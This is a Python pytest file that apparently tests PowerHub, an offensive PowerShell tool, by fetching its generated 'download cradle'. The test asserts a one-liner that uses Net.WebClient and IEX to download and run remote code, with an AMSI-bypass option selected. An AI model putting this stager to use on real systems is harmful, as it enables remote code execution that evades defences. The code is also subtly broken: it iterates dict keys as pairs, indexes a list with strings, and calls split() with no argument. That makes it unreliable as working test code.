#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from subprocess import check_output
from shlex import split
#  import tempfile
#  import re
import requests

import pytest

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, TEST_COMMANDS, init_tests  # noqa


init_tests()


def get_stager():
    result = []
    PORT = '8080'
    param_set = {
        'default': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        }
    }
    i = 0
    while i < 10:
        try:
            for k, v in param_set:
                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                                         params=v).text
            break
        except Exception:
            i += 1
            time.sleep(.5)
    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace('"',
                                                                    '\\"')
    return result


def execute_cradle():
    return check_output(split())[:-1].decode()


@pytest.fixture
def full_app():
    from powerhub import powerhub
    from powerhub import reverseproxy
    powerhub.main(fully_threaded=True)
    yield get_stager()
    reverseproxy.reactor.stop()


def test_stager(full_app):
    assert full_app['default'] == (
        "$K=New-Object Net.WebClient;IEX "
        + f"$K.DownloadString('http://{TEST_URI}:8080"
        + "/0?t=http&f=h&a=reflection');"
    )
